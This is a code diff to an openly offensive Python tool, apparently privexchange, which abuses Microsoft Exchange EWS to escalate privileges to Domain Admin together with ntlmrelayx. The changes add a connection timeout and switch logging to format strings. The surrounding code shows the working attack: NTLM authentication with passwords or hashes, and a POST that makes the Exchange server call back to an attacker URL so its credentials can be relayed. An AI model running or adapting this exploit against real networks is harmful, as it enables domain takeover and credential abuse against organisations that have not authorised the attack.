@@ -75,15 +75,15 @@ def do_privexchange(host):
             port = int(args.exchange_port)
         try:
             uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-            session = HTTPSConnection(host, port, context=uv_context)
+            session = HTTPSConnection(host, port, timeout=args.timeout, context=uv_context)
         except AttributeError:
-            session = HTTPSConnection(host, port)
+            session = HTTPSConnection(host, port, timeout=args.timeout)
     else:
         # Otherwise: HTTP
         port = 80
         if args.exchange_port:
             port = int(args.exchange_port)
-        session = HTTPConnection(host, port)
+        session = HTTPConnection(host, port, timeout=args.timeout)
 
     # Construct attacker url
     if args.attacker_port != 80:
@@ -116,10 +116,10 @@ def do_privexchange(host):
         logging.info('Status code returned: {}. Authentication does not seem required for URL'.format(res.status))
     try:
         if 'NTLM' not in res.getheader('WWW-Authenticate'):
-            logging.error('NTLM Auth not offered by URL, offered protocols: %s', res.getheader('WWW-Authenticate'))
+            logging.error('NTLM Auth not offered by URL, offered protocols: {}'.format(res.getheader('WWW-Authenticate')))
             return False
     except (KeyError, TypeError):
-        logging.error('No authentication requested by the server for url %s', ews_url)
+        logging.error('No authentication requested by the server for url {}'.format(ews_url))
         return False
 
     logging.debug('Got 401, performing NTLM authentication')
@@ -145,19 +145,19 @@ def do_privexchange(host):
     auth = base64.b64encode(ntlm_auth.getData())
 
     headers = {
-        "Authorization": 'NTLM %s' % auth,
+        "Authorization": 'NTLM {}'.format(auth),
         "Content-type": "text/xml; charset=utf-8",
         "Accept": "text/xml",
         "User-Agent": "ExchangeServicesClient/0.0.0.0",
         "Translate": "F"
     }
 
-    session.request("POST", ews_url, POST_BODY % (args.exchange_version, attacker_url), headers)
+    session.request("POST", ews_url, POST_BODY.format(args.exchange_version, attacker_url), headers)
     res = session.getresponse()
 
-    logging.debug('HTTP status: %d', res.status)
+    logging.debug('HTTP status: {}'.format(res.status))
     body = res.read()
-    logging.debug('Body returned: %s', body)
+    logging.debug('Body returned: {}'.format(body))
     if res.status == 200:
         logging.info('Exchange returned HTTP status 200 - authentication was OK')
         # Parse XML with ElementTree
@@ -166,14 +166,14 @@ def do_privexchange(host):
         for response in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseCode'):
             code = response.text
         if not code:
-            logging.error('Could not find response code element in body: %s', body)
+            logging.error('Could not find response code element in body: {}'.format(body))
             return
         if code == 'NoError':
             logging.info('API call was successful')
         elif code == 'ErrorMissingEmailAddress':
             logging.error('The user you authenticated with does not have a mailbox associated. Try a different user.')
         else:
-            logging.error('Unknown error %s', code)
+            logging.error('Unknown error {}'.format(code))
             for errmsg in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseMessages'):
                 logging.error('Server returned: %s', errmsg.text)
         # Detect Exchange 2010
@@ -188,13 +188,14 @@ def do_privexchange(host):
                 logging.error('Server does not accept this Exchange dialect, specify a different Exchange version with --exchange-version')
                 return
         else:
-            logging.error('Server returned HTTP %d: %s', res.status, body)
+            logging.error('Server returned HTTP {}: {}'.format(res.status, body))
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Exchange your privileges for Domain Admin privs by abusing Exchange. Use me with ntlmrelayx')
     parser.add_argument("hosts", nargs='+', type=str, metavar='HOSTNAME', help="Hostname/ip of the Exchange server")
     parser.add_argument("-u", "--user", metavar='USERNAME', help="username for authentication")
     parser.add_argument("-d", "--domain", metavar='DOMAIN', help="domain the user is in (FQDN or NETBIOS domain name)")
+    parser.add_argument("-t", "--timeout", default=10, type=int, metavar="TIMEOUT", help="HTTP(s) connection timeout (Default: 10 seconds)")
     parser.add_argument("-p", "--password", metavar='PASSWORD', help="Password for authentication, will prompt if not specified and no NT:NTLM hashes are supplied")
     parser.add_argument('--hashes', action='store', help='LM:NLTM hashes')
     parser.add_argument("--no-ssl", action='store_true', help="Don't use HTTPS (connects on port 80)")
@@ -205,7 +206,6 @@ if __name__ == '__main__':
     parser.add_argument("--attacker-page", default="/privexchange/", help="Page to request on attacker server (default: /privexchange/)")
     parser.add_argument("--debug", action='store_true', help='Enable debug output')
     args = parser.parse_args()
-
 
     ews_url = "/EWS/Exchange.asmx"
 
